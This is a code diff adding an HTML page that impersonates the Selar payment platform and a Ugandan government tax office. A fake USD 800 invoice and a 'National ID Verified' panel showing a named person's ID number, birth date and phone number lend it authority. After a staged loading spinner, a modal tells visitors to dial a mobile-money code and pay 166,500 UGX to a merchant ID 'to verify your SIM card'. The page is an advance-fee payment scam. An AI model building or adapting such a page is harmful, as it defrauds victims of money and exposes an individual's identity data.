@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment - Selar</title>
+    <style>
+        /* Reset and Mobile-First Scaling */
+        * { box-sizing: border-box; }
+        body { 
+            background-color: #fcfcfc; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center;
+            padding: 10px; 
+            margin: 0;
+        }
+        
+        .invoice-card { 
+            width: 100%; 
+            max-width: 400px; 
+            background: white; 
+            text-align: center; 
+            padding-top: 20px; 
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+        }
+
+        /* Animations */
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .country-badge { display: inline-flex; align-items: center; border: 1px solid #e0e0e0; border-radius: 20px; padding: 4px 16px; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 25px; }
+        .status-dot { height: 10px; width: 10px; background-color: #00a651; border-radius: 50%; margin-right: 8px; animation: blink 1.5s infinite; }
+        .logo-circle { width: 70px; height: 70px; background-color: #5a0b4d; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; color: white; font-family: 'serif'; font-size: 24px; font-style: italic; font-weight: bold; }
+        .title-row { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 15px 0 8px; }
+        .title-row h2 { font-size: 20px; margin: 0; color: #000; font-weight: 800; }
+        .verified-badge { color: #00a651; font-size: 14px; display: flex; align-items: center; gap: 4px; animation: blink 1.5s infinite; font-weight: bold; }
+
+        /* Official Receipt Styling */
+        .image-receipt-box { 
+            border: 1.5px solid #eaeaea; 
+            padding: 20px; 
+            margin: 20px 15px; 
+            text-align: left; 
+            background: #fafafa; 
+            font-family: 'Courier New', Courier, monospace;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+        .image-receipt-box::before {
+            content: "SECURE";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-30deg);
+            font-size: 40px;
+            color: rgba(0, 0, 0, 0.03);
+            pointer-events: none;
+            font-weight: 900;
+        }
+        .receipt-header-main { text-align: center; font-weight: bold; font-size: 18px; color: #333; letter-spacing: 1px; }
+        .receipt-center { text-align: center; color: #666; font-weight: bold; }
+        .receipt-line { margin-bottom: 4px; font-size: 11px; color: #444; border-bottom: 1px dashed #eee; padding-bottom: 2px; }
+        .receipt-bold { font-weight: 800; text-align: center; margin: 10px 0; color: #000; }
+        .red-status { 
+            color: #ffffff; 
+            background: #e74c3c;
+            font-weight: bold; 
+            text-align: center; 
+            font-size: 10px; 
+            margin-top: 15px; 
+            padding: 5px;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        /* Form Styles */
+        .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
+        .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; margin-bottom: 15px; background: #fff; }
+        .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; color: #444; padding-left: 10px; width: 40%; }
+        .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; }
+
+        /* National ID Verified Section */
+        .id-verified-section {
+            width: 100%;
+            max-width: 400px;
+            background-color: #f0fff4;
+            /* Added Uganda Flag background to the entire section container */
+            background-image: 
+              linear-gradient(180deg, #000 16.6%, transparent 16.6%),
+              linear-gradient(180deg, #FCDC04 16.6%, transparent 16.6%),
+              linear-gradient(180deg, #D9121F 16.6%, transparent 16.6%),
+              linear-gradient(180deg, #000 16.6%, transparent 16.6%),
+              linear-gradient(180deg, #FCDC04 16.6%, transparent 16.6%),
+              linear-gradient(180deg, #D9121F 16.6%);
+            background-size: 100% 600%; /* Total height to cover all six bands */
+            background-repeat: repeat-y;
+            
+            border: 1px solid #c6f6d5;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 10px;
+            text-align: left;
+            position: relative; /* For crane centering if needed */
+        }
+        
+        /* Simpler background-image approach using gradient bands */
+        .id-verified-section {
+            background: 
+              linear-gradient(#000 16.67%, #FCDC04 16.67%, #FCDC04 33.34%, #D9121F 33.34%, #D9121F 50.01%, #000 50.01%, #000 66.68%, #FCDC04 66.68%, #FCDC04 83.35%, #D9121F 83.35%);
+            background-color: #f0fff4; /* Fallback */
+            background-blend-mode: overlay; /* To subtle the flag colors against the green */
+        }
+
+        .id-header {
+            color: #22543d;
+            font-weight: 800;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #9ae6b4;
+            padding-bottom: 8px;
+        }
+        .id-grid {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr;
+            gap: 8px;
+            font-size: 13px;
+        }
+        .id-label { color: #4a5568; font-weight: bold; text-transform: uppercase; font-size: 11px; }
+        .id-value { color: #1a202c; font-weight: 600; }
+
+        /* Overlay & Modal */
+        #loadingOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #00a651; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        
+        #instructionModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 10000; }
+        .modal-content { background: white; width: 90%; max-width: 360px; border-radius: 15px; overflow: hidden; text-align: center; }
+        .modal-head { background: #e74c3c; color: white; padding: 20px; }
+        .modal-body { padding: 20px; text-align: left; font-size: 14px; line-height: 1.5; }
+        .btn-ok { display: block; background: #00a651; color: white; text-decoration: none; padding: 15px; margin: 10px 20px; border-radius: 8px; font-weight: bold; }
+        .btn-later { background: none; border: none; color: #999; padding: 10px; cursor: pointer; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="invoice-card">
+    <div class="country-badge"><span class="status-dot"></span> GOVERNMENT TAX 🇺🇬</div>
+    <div class="logo-circle">Selar</div>
+
+    <div class="title-row">
+        <h2>selar-invoice-800usd</h2>
+        <div class="verified-badge">✔ Verified</div>
+    </div>
+
+    <div class="image-receipt-box">
+        <div class="receipt-header-main">SELAR OFFICIAL INVOICE</div>
+        <div class="receipt-center" style="font-size: 10px; margin-bottom: 10px;">E-RECEIPT #TRX-99284-UG</div>
+        <div class="receipt-center" style="margin-bottom: 10px; opacity: 0.3;">****************************</div>
+        
+        <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
+        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar invoice Account Number]</div>
+        <div class="receipt-line"><strong>NAME:</strong> LOLIKISHEE USA Chicago 🇺🇲</div>
+        
+        <div style="margin-top: 12px; padding: 8px; background: #fff; border-radius: 6px; border: 1px solid #eee;">
+            <div class="receipt-line" style="border:none;"><strong>RECIPIENT ID:</strong> SI001234595</div>
+            <div class="receipt-bold" style="text-decoration: underline; margin: 2px 0;">LATIF NABONGO</div>
+            <div class="receipt-line" style="border:none;"><strong>MOBILE:</strong> +256701787243</div>
+            <div class="receipt-line" style="border:none;"><strong>NETWORK:</strong> AIRTEL UGANDA</div>
+        </div>
+
+        <div class="receipt-line" style="margin-top: 15px; text-align: center; border: none;"><strong>TOTAL PAYABLE AMOUNT:</strong></div>
+        <div class="receipt-bold" style="font-size: 22px; margin-top: 0;">USD 800.00</div>
+        
+        <div class="receipt-center" style="margin-top: 10px; opacity: 0.3;">----------------------------</div>
+        <div class="red-status">PENDING: TAX VERIFICATION REQUIRED (166,500 UGX)</div>
+        
+        <div class="receipt-center" style="font-family: sans-serif; font-size: 20px; margin-top: 15px; font-weight: 900; letter-spacing: 6px; color: #5a0b4d; opacity: 0.8;">SELAR</div>
+    </div>
+
+    <div class="main-amount" style="font-size: 32px; font-weight: 800; color: #333;">UGX 166,500</div>
+    <div style="color: #888; font-size: 12px; margin-bottom: 20px; padding: 0 20px;">Provide your mobile number to initiate secure payment.</div>
+
+    <div class="payment-box">
+        <form id="paymentForm">
+            <div class="input-group">
+                <input type="text" id="phoneNum" placeholder="07XXXXXXXX" required pattern="[0-9]{10}">
+                <button type="submit" class="continue-btn">Continue</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="id-verified-section">
+    <div class="id-header">
+        <span>✅ National ID Verified</span>
+    </div>
+    <div class="id-grid">
+        <div class="id-label">Surname:</div>
+        <div class="id-value">NABONGO</div>
+        
+        <div class="id-label">Given Name:</div>
+        <div class="id-value">LATIF HUSSIEN</div>
+        
+        <div class="id-label">Nationality:</div>
+        <div class="id-value">UGA</div>
+        
+        <div class="id-label">Sex:</div>
+        <div class="id-value">M</div>
+        
+        <div class="id-label">Date of Birth:</div>
+        <div class="id-value">29.09.1998</div>
+        
+        <div class="id-label">NIN:</div>
+        <div class="id-value">CM98051109L48H</div>
+        
+        <div class="id-label">Card No:</div>
+        <div class="id-value"019244828</div>
+        
+        <div class="id-label">Expiry Date:</div>
+        <div class="id-value">23.10.2028</div>
+    </div>
+</div>
+
+<div id="loadingOverlay">
+    <div class="spinner"></div>
+    <h3 id="loadText" style="padding: 0 40px; text-align: center; font-size: 18px; color: #333;"></h3>
+</div>
+
+<div id="instructionModal">
+    <div class="modal-content">
+        <div class="modal-head">
+            <strong>SELAR MERCHANT TRANSACTION</strong><br>
+            <div style="background:white; color:#e74c3c; display:inline-block; padding:2px 10px; border-radius:5px; margin-top:10px; font-weight:bold;">
+                Pay Government Tax 🇺🇬
+            </div>
+        </div>
+        <div class="modal-body">
+            <p><strong>How to Pay Government Tax [Use Merchant ID~6837633]:</strong></p>
+            <p>📞 <strong>Dial: *185*9#</strong></p>
+            <p>🆔 Enter Merchant ID: <strong>6837633</strong></p>
+            <p>💵 Enter Amount: <strong>166500</strong></p>
+            <p>🔖 Reference: <strong>selar merchant</strong></p>
+            <p style="font-size:12px; border-top:1px solid #eee; padding-top:10px; margin-top:10px;">Confirm payment to verify your SIM card.</p>
+        </div>
+        
+        <a href="tel:*185*9%23" class="btn-ok">Pay Now</a>
+        <button class="btn-later" onclick="closeModal()">Pay Later</button>
+    </div>
+</div>
+
+<script>
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        process();
+    });
+
+    function process() {
+        const val = document.getElementById('phoneNum').value;
+        if(val.length < 10) return alert("Enter valid number");
+        
+        document.getElementById('loadText').innerText = `Initiating invoice ${val} for merchant transaction of 800$~2,906,702.40UGX`;
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('instructionModal').style.display = 'flex';
+        }, 7000);
+    }
+
+    function closeModal() {
+        document.getElementById('instructionModal').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
